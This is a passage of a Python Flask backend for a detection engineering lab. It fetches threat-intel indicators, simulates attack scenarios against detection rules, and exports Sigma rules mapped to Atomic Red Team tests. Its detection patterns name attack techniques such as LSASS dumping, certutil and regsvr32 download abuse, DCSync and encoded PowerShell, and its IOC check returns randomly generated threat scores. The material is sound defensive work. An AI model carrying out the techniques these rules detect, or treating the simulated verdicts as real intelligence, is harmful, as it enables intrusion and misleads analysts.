            otx_resp = requests.get(
                "https://otx.alienvault.com/api/v1/pulses/subscribed?limit=10&page=1",
                headers={"X-OTX-API-KEY": OTX_KEY},
                timeout=10
            )
            otx_resp.raise_for_status()
            otx_data = otx_resp.json()
            pulses = otx_data.get("results", [])
            normalised = []
            for pulse in pulses:
                pulse_name = pulse.get("name", "Unknown")
                tags = pulse.get("tags", [])[:3]
                for indicator in pulse.get("indicators", [])[:5]:
                    ioc_type = indicator.get("type", "")
                    # Show network-based IOC types
                    if ioc_type not in ("URL", "domain", "IPv4", "hostname", "IPv6", "FQDN", "URI"):
                        continue
                    ioc_val = indicator.get("indicator", "")
                    host = ioc_val
                    if ioc_type == "URL":
                        try:
                            host = ioc_val.split("/")[2]
                        except Exception:
                            host = ioc_val
                    normalised.append({
                        "url":        ioc_val,
                        "host":       host,
                        "url_status": "online",
                        "threat":     pulse_name[:30],
                        "tags":       tags or [ioc_type.lower()],
                        "reporter":   pulse.get("author_name", "OTX"),
                        "date_added": indicator.get("created", pulse.get("created", "")),
                    })
                if len(normalised) >= 15:
                    break
            if normalised:
                audit_log("threat_intel_source", "otx_live")
                return jsonify({
                    "success": True,
                    "stats": build_stats(normalised, "AlienVault OTX (live)"),
                    "urls": normalised[:15]
                })
        except Exception as e:
            audit_log("otx_failed", str(e)[:64])
    else:
        audit_log("otx_skipped", "OTX_API_KEY not set in environment")

    # ── Source 2: ThreatFox recent IOCs ──
    try:
        tf_resp = requests.post(
            "https://threatfox-api.abuse.ch/api/v1/",
            json={"query": "get_iocs", "days": 1},
            headers={"Content-Type": "application/json"},
            timeout=8
        )
        tf_resp.raise_for_status()
        tf_data = tf_resp.json()
        iocs = tf_data.get("data") or []
        if iocs:
            normalised = []
            for ioc in iocs[:15]:
                host = ioc.get("ioc_value", "")
                if ":" in host and not host.startswith("http"):
                    host = host.split(":")[0]
                threat = ioc.get("malware", ioc.get("threat_type", "unknown"))
                tags = [ioc.get("threat_type", ""), ioc.get("malware_printable", "")]
                tags = [t for t in tags if t]
                normalised.append({
                    "url":        ioc.get("ioc_value", ""),
                    "host":       host,
                    "url_status": "online",
                    "threat":     threat,
                    "tags":       tags,
                    "reporter":   ioc.get("reporter", "threatfox"),
                    "date_added": ioc.get("first_seen", ""),
                })
            audit_log("threat_intel_source", "threatfox_live")
            return jsonify({"success": True, "stats": build_stats(normalised, "ThreatFox API (live)"), "urls": normalised})
    except Exception as e:
        audit_log("threatfox_failed", str(e)[:64])

    # ── Source 3: URLhaus ──
    try:
        uh_resp = requests.post(
            "https://urlhaus-api.abuse.ch/v1/urls/recent/limit/15/",
            data="", headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=8
        )
        uh_resp.raise_for_status()
        uh_data = uh_resp.json()
        urls = uh_data.get("urls") or uh_data.get("data") or []
        if urls:
            normalised = []
            for u in urls:
                raw_url = u.get("url", "")
                try:
                    host = raw_url.split("/")[2] if "http" in raw_url else raw_url
                except Exception:
                    host = raw_url
                normalised.append({
                    "url":        raw_url,
                    "host":       u.get("host", host),
                    "url_status": u.get("url_status", "unknown"),
                    "threat":     (u.get("tags") or ["unknown"])[0],
                    "tags":       u.get("tags") or [],
                    "reporter":   u.get("reporter", "abuse.ch"),
                    "date_added": u.get("date_added", ""),
                })
            audit_log("threat_intel_source", "urlhaus_live")
            return jsonify({"success": True, "stats": build_stats(normalised, "URLhaus API (live)"), "urls": normalised})
    except Exception as e:
        audit_log("urlhaus_failed", str(e)[:64])

    # ── Source 4: Sample fallback ──
    audit_log("threat_intel_source", "sample_fallback")
    return jsonify({"success": False, "stats": build_stats(SAMPLE, "Sample IOCs — curated dataset"), "urls": SAMPLE})


@app.route("/api/check-ioc", methods=["POST"])
@rate_limit
@require_json
def check_ioc():
    """Check an IP/domain against threat intel sources"""
    data = request.json or {}
    ioc = sanitise_string(data.get("ioc", ""), max_len=MAX_IOC_LEN)
    if not ioc:
        return jsonify({"error": "No IOC provided"}), 400
    if not _IOC_PATTERN.match(ioc):
        audit_log("invalid_ioc", ioc[:64])
        return jsonify({"error": "Invalid IOC format. Accepted: IPv4, domain, URL, MD5/SHA256"}), 422
    if is_internal_ip(ioc):
        audit_log("ssrf_attempt", ioc[:64])
        return jsonify({"error": "Internal IPs rejected — SSRF not today"}), 422
    audit_log("ioc_check", ioc[:64])

    # Simulate IOC enrichment (in production: query VirusTotal, OTX, etc.)
    known_malicious_patterns = ["185.220.101", "203.0.113", "malware", "evil-c2", "payload-delivery",
                                  "fakems", "update-cdn.fake", "45.142.212"]
    is_malicious = any(p in ioc.lower() for p in known_malicious_patterns)
    is_tor = ioc.startswith("185.220")

    return jsonify({
        "ioc": ioc,
        "verdict": "malicious" if is_malicious else "clean",
        "threat_score": random.randint(78, 97) if is_malicious else random.randint(2, 18),
        "category": "Tor Exit Node" if is_tor else ("C2 Infrastructure" if is_malicious else "Unknown"),
        "sources_checked": ["abuse.ch URLhaus", "Local IOC DB", "Tor Exit Node List"],
        "first_seen": "2024-02-14" if is_malicious else None,
        "tags": ["c2", "tor"] if is_tor else (["malware", "dropper"] if is_malicious else []),
        "recommendation": "Block at perimeter + hunt for connections" if is_malicious else "No action required"
    })


@app.route("/api/simulate", methods=["POST"])
@rate_limit
@require_json
def simulate():
    """Run attack simulation and return detection results"""
    data = request.json or {}
    raw = sanitise_string(data.get("scenario", ""), max_len=64)
    if raw not in VALID_SCENARIOS:
        return jsonify({"error": f"Unknown scenario. Valid: {sorted(VALID_SCENARIOS)}"}), 422
    scenario = raw
    audit_log("simulate", scenario)

    events = generate_scenario_events(scenario)
    all_alerts = []
    rule_summary = []

    for rule in DETECTION_RULES:
        alerts = rule.evaluate(events)
        rule_summary.append({
            "rule_id": rule.rule_id,
            "rule_name": rule.name,
            "mitre_id": rule.mitre_id,
            "severity": rule.severity,
            "alerts_fired": len(alerts)
        })
        all_alerts.extend(alerts)

    # Sort alerts by severity
    sev_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3}
    all_alerts.sort(key=lambda a: sev_order.get(a["severity"], 9))

    return jsonify({
        "scenario": scenario,
        "events_analyzed": len(events),
        "total_alerts": len(all_alerts),
        "alerts": all_alerts,
        "rule_summary": rule_summary,
        "entropy_samples": [
            {"label": "clean_cmd", "value": round(calculate_entropy("ipconfig /all"), 3)},
            {"label": "b64_payload", "value": round(calculate_entropy("JABjAGwAaQBlAG4AdAAgAD0A"), 3)},
        ]
    })


@app.route("/api/rules")
@rate_limit
def get_rules():
    """Return all detection rules"""
    return jsonify([{
        "rule_id": r.rule_id,
        "name": r.name,
        "mitre_id": r.mitre_id,
        "tactic": r.tactic,
        "severity": r.severity,
        "description": r.description,
        "hit_count": r.hit_count
    } for r in DETECTION_RULES])


@app.route("/api/validate-rule", methods=["POST"])
@rate_limit
@require_json
def validate_rule():
    """Validate a SIEM rule query for syntax and best practices"""
    data = request.json or {}
    query = sanitise_string(data.get("query", ""), max_len=MAX_QUERY_LEN)
    checks = []

    checks.append({"check": "Pipeline operators", "pass": "|" in query,
                   "detail": "Use | to chain filters and aggregations"})
    checks.append({"check": "Filter condition", "pass": bool(re.search(r'\bwhere\b|\bWHERE\b|\bfilter\b', query)),
                   "detail": "Rule must filter events, not return all"})
    checks.append({"check": "Aggregation present", "pass": bool(re.search(r'\bstats\b|\bcount\b|\bsum\b|\bby\b', query, re.I)),
                   "detail": "Group events to reduce noise"})
    checks.append({"check": "Threshold defined", "pass": bool(re.search(r'\bwhere\b.*[><=]|\bcount\b.*[><=]', query, re.I)),
                   "detail": "Numeric threshold reduces false positives"})
    checks.append({"check": "Adequate complexity", "pass": len(query.strip()) > 60,
                   "detail": "Rule should have meaningful logic, not just a keyword search"})

    passed = sum(1 for c in checks if c["pass"])
    score = int((passed / len(checks)) * 100)
    return jsonify({"checks": checks, "score": score,
                    "verdict": "Ready to deploy" if score >= 80 else "Needs improvement"})


@app.route("/api/mitre-coverage")
@rate_limit
def mitre_coverage():
    """Return MITRE ATT&CK coverage heatmap data"""
    covered = sum(1 for t in MITRE_COVERAGE if t["status"] == "covered")
    partial = sum(1 for t in MITRE_COVERAGE if t["status"] == "partial")
    uncovered = sum(1 for t in MITRE_COVERAGE if t["status"] == "uncovered")
    total = len(MITRE_COVERAGE)
    return jsonify({
        "techniques": MITRE_COVERAGE,
        "stats": {
            "covered": covered,
            "partial": partial,
            "uncovered": uncovered,
            "total": total,
            "coverage_pct": round((covered / total) * 100)
        }
    })


@app.route("/api/entropy", methods=["POST"])
@rate_limit
@require_json
def entropy_api():
    """Calculate Shannon entropy of a given string"""
    data = request.json or {}
    text = sanitise_string(data.get("text", ""), max_len=MAX_TEXT_LEN, strip_html=False)
    if not text:
        return jsonify({"error": "No text provided"}), 400
    score = calculate_entropy(text)
    verdict = ("high — likely encoded/compressed" if score > 4.5
               else "medium — possible obfuscation" if score > 3.0
               else "low — likely plaintext")
    return jsonify({"text_length": len(text), "entropy": round(score, 4),
                    "verdict": verdict,
                    "bits_per_char": round(score, 4)})


@app.route("/api/sigma/<rule_id>")
@rate_limit
def export_sigma(rule_id):
    # Path traversal guard (T1083/T1190)
    rule_id = re.sub(r"[^A-Z0-9-]", "", rule_id.upper())[:10]
    """Export a detection rule as a Sigma YAML rule"""
    rule = next((r for r in DETECTION_RULES if r.rule_id == rule_id), None)
    if not rule:
        return jsonify({"error": f"Rule {rule_id} not found"}), 404

    # Map severity to Sigma levels
    sev_map = {"Critical": "critical", "High": "high", "Medium": "medium", "Low": "low"}
    
    # Build logsource based on tactic
    logsource_map = {
        "Execution": {"category": "process_creation", "product": "windows"},
        "Credential Access": {"category": "security", "product": "windows"},
        "Command & Control": {"category": "dns", "product": "windows"},
        "Lateral Movement": {"category": "security", "product": "windows"},
        "Impact": {"category": "file_event", "product": "windows"},
        "Defense Evasion": {"category": "process_creation", "product": "windows"},
        "Persistence": {"category": "registry_event", "product": "windows"},
    }
    logsource = logsource_map.get(rule.tactic, {"category": "security", "product": "windows"})

    # Detection condition per rule
    detection_map = {
        "DR-001": {
            "selection": {"CommandLine|contains|all": ["-enc", "-nop"]},
            "filter": {"User|contains": ["svc_deploy"]},
            "condition": "selection and not filter"
        },
        "DR-002": {"selection": {"EventID": 4625, "LogonType": 10}, "condition": "selection | count() by IpAddress > 10"},
        "DR-003": {"selection": {"QueryName|re": "[A-Za-z0-9+/]{25,}\\."}, "condition": "selection | count() by QueryName > 20"},
        "DR-004": {"selection": {"EventID": 10, "TargetImage|endswith": "lsass.exe", "GrantedAccess|contains": ["0x1010", "0x143a"]}, "condition": "selection"},
        "DR-005": {"selection": {"EventID": 4624, "LogonType": 3, "AuthenticationPackageName": "NTLM"}, "condition": "selection | count() by SubjectUserName > 3"},
        "DR-006": {"selection": {"TargetFilename|endswith": [".locked", ".encrypted", ".wncry", ".cerber"]}, "condition": "selection | count() by ProcessId > 20"},
        "DR-007": {"selection": {"EventID": 4769, "TicketEncryptionType": "0x17"}, "condition": "selection | count() by SubjectUserName > 3"},
        "DR-008": {"selection": {"Image|endswith": ["certutil.exe", "mshta.exe", "regsvr32.exe"], "CommandLine|contains": ["-urlcache", "http://", "scrobj.dll"]}, "condition": "selection"},
        "DR-009": {"selection": {"EventID": [19, 20, 21]}, "filter": {"Consumer|contains": ["scm event log consumer"]}, "condition": "selection and not filter"},
        "DR-010": {"selection": {"EventID": 4662, "Properties|contains": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"}, "condition": "selection"},
        "DR-011": {"selection": {"EventID": [4698, 4702], "TaskContent|contains": ["powershell", "cmd.exe", "appdata"]}, "condition": "selection"},
    }

    detection = detection_map.get(rule_id, {"selection": {"EventID": 4688}, "condition": "selection"})

    # Pure-Python YAML builder — no PyYAML dependency
    def _yl(v, indent=0):
        pad = "  " * indent
        if isinstance(v, dict):
            lines = []
            for k, val in v.items():
                if isinstance(val, (dict, list)):
                    lines.append(f"{pad}{k}:")
                    lines.append(_yl(val, indent + 1))
                else:
                    lines.append(f"{pad}{k}: {_yl(val, 0)}")
            return "\n".join(lines)
        elif isinstance(v, list):
            return "\n".join(f"{pad}- {_yl(i, 0)}" for i in v)
        elif isinstance(v, str):
            if any(c in v for c in [':', '#', '{', '}', '[', ']', '&', '*', '|']):
                return f"'{v.replace(chr(39), chr(39)*2)}'"
            return v
        elif isinstance(v, bool):
            return "true" if v else "false"
        return str(v)

    tactic_tag = rule.tactic.lower().replace(" ", "_").replace("&", "and")
    lines = [
        "---",
        f"title: '{rule.name}'",
        f"id: det-lab-{rule_id.lower()}",
        "status: experimental",
        f"description: '{rule.description}'",
        "references:",
        f"  - 'https://attack.mitre.org/techniques/{rule.mitre_id.replace(".", "/")}/'",
        "author: 'Krutik - Detection Engineering Lab'",
        "date: 2024/03/15",
        "tags:",
        f"  - attack.{tactic_tag}",
        f"  - attack.{rule.mitre_id.lower()}",
        "logsource:",
        _yl(logsource, 1),
        "detection:",
        _yl(detection, 1),
        "falsepositives:",
        "  - Legitimate administrative activity",
        "  - Security scanning tools",
        f"level: {sev_map.get(rule.severity, 'medium')}",
        "",
    ]
    yaml_str = "\n".join(lines)
    from flask import Response
    return Response(yaml_str, mimetype="text/yaml",
                    headers={"Content-Disposition": f"attachment; filename={rule_id}_sigma.yml"})


@app.route("/api/sigma-all")
@rate_limit
def export_all_sigma():
    """Export all rules as Sigma YAML bundle"""
    rule_ids = [r.rule_id for r in DETECTION_RULES]
    rules_yaml = []
    for rid in rule_ids:
        with app.test_request_context():
            resp = export_sigma(rid)
            if hasattr(resp, 'get_data'):
                rules_yaml.append(resp.get_data(as_text=True))
    bundle = "---\n".join(rules_yaml)
    from flask import Response
    return Response(bundle, mimetype="text/yaml",
                    headers={"Content-Disposition": "attachment; filename=detection_lab_sigma_bundle.yml"})


@app.route("/api/atomic-red-team")
@rate_limit
def atomic_red_team():
    """Return Atomic Red Team test IDs mapped to each detection rule"""
    art_mapping = [
        {"rule_id": "DR-001", "rule_name": "Obfuscated PowerShell", "mitre": "T1059.001",
         "art_tests": [
             {"test_id": "T1059.001-1", "name": "Mimikatz PowerShell", "executor": "powershell"},
             {"test_id": "T1059.001-2", "name": "Run BloodHound from Memory", "executor": "powershell"},
             {"test_id": "T1059.001-4", "name": "Encoded PowerShell Command", "executor": "command_prompt"},
         ]},
        {"rule_id": "DR-002", "rule_name": "RDP Brute Force", "mitre": "T1110.001",
         "art_tests": [
             {"test_id": "T1110.001-1", "name": "Password Brute Force via SSH", "executor": "bash"},
             {"test_id": "T1110.001-2", "name": "Password Brute Force via RDP", "executor": "command_prompt"},
         ]},
        {"rule_id": "DR-003", "rule_name": "DNS Tunneling", "mitre": "T1071.004",
         "art_tests": [
             {"test_id": "T1071.004-1", "name": "DNS Large Query", "executor": "command_prompt"},
             {"test_id": "T1071.004-3", "name": "DNS C2 via dnscat2", "executor": "bash"},
         ]},
        {"rule_id": "DR-004", "rule_name": "LSASS Memory Access", "mitre": "T1003.001",
         "art_tests": [
             {"test_id": "T1003.001-1", "name": "Windows Credential Editor", "executor": "command_prompt"},
             {"test_id": "T1003.001-2", "name": "Dump LSASS.exe via ProcDump", "executor": "command_prompt"},
             {"test_id": "T1003.001-5", "name": "Dump LSASS via comsvcs.dll", "executor": "command_prompt"},
         ]},
        {"rule_id": "DR-005", "rule_name": "Pass-the-Hash", "mitre": "T1550.002",
         "art_tests": [
             {"test_id": "T1550.002-1", "name": "Mimikatz Pass-the-Hash", "executor": "command_prompt"},
             {"test_id": "T1550.002-2", "name": "crackmapexec Pass-the-Hash", "executor": "bash"},
         ]},
        {"rule_id": "DR-006", "rule_name": "Ransomware File Encryption", "mitre": "T1486",
         "art_tests": [
             {"test_id": "T1486-1", "name": "Ransomware — Encrypt files using OpenSSL", "executor": "bash"},
             {"test_id": "T1490-1", "name": "Delete Volume Shadow Copies", "executor": "command_prompt"},
         ]},
        {"rule_id": "DR-007", "rule_name": "Kerberoasting", "mitre": "T1558.003",
         "art_tests": [
             {"test_id": "T1558.003-1", "name": "Request for All Service Principle Names", "executor": "powershell"},
             {"test_id": "T1558.003-3", "name": "Rubeus kerberoasting", "executor": "powershell"},
         ]},
        {"rule_id": "DR-008", "rule_name": "LOLBin Abuse", "mitre": "T1218",
         "art_tests": [
             {"test_id": "T1218.001-1", "name": "Compile After Delivery via Csc.exe", "executor": "command_prompt"},
             {"test_id": "T1218.003-1", "name": "CMSTP Bypass UAC", "executor": "command_prompt"},
             {"test_id": "T1218.010-1", "name": "Regsvr32 remote COM scriptlet", "executor": "command_prompt"},
         ]},
        {"rule_id": "DR-009", "rule_name": "WMI Persistence", "mitre": "T1546.003",
         "art_tests": [
             {"test_id": "T1546.003-1", "name": "Persistence via WMI Event Subscription", "executor": "powershell"},
             {"test_id": "T1546.003-2", "name": "Persistence via WMI subscription — CommandLineEventConsumer", "executor": "powershell"},
         ]},
        {"rule_id": "DR-010", "rule_name": "DCSync Attack", "mitre": "T1003.006",
         "art_tests": [
             {"test_id": "T1003.006-1", "name": "DCSync (Active Directory)", "executor": "command_prompt"},
             {"test_id": "T1003.006-2", "name": "DCSync via mimikatz lsadump", "executor": "command_prompt"},
         ]},
        {"rule_id": "DR-011", "rule_name": "Scheduled Task Persistence", "mitre": "T1053.005",
         "art_tests": [
             {"test_id": "T1053.005-1", "name": "Scheduled Task Startup Script", "executor": "command_prompt"},
             {"test_id": "T1053.005-4", "name": "Powershell Cmdlet Scheduled Task", "executor": "powershell"},
         ]},
    ]
    return jsonify({"total_rules": len(art_mapping), "mappings": art_mapping})



# ─────────────────────────────────────────────
# GLOBAL ERROR HANDLERS — never leak stack traces
# ─────────────────────────────────────────────

@app.errorhandler(400)
def bad_request(e): return jsonify({"error": "Bad request"}), 400

@app.errorhandler(404)
def not_found(e): return jsonify({"error": "Endpoint not found"}), 404

@app.errorhandler(405)
def method_not_allowed(e): return jsonify({"error": "Method not allowed"}), 405

@app.errorhandler(413)
def too_large(e): return jsonify({"error": "Request body too large (max 64 KB)"}), 413

@app.errorhandler(429)
def too_many(e): return jsonify({"error": "Too many requests"}), 429

@app.errorhandler(500)
def server_error(e):
    audit_log("internal_error", str(e)[:64])
    return jsonify({"error": "Internal server error"}), 500


if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5050))
    debug = os.environ.get("FLASK_ENV") != "production"
    print("\n╔══════════════════════════════════════════╗")
    print("║   Detection Engineering Lab — Backend    ║")
    print(f"║   Rules loaded: {len(DETECTION_RULES)}  |  Techniques: {len(MITRE_COVERAGE)}    ║")
    print(f"║   Port: {port:<34}║")
    print("╚══════════════════════════════════════════╝\n")
    app.run(debug=debug, host="0.0.0.0", port=port)
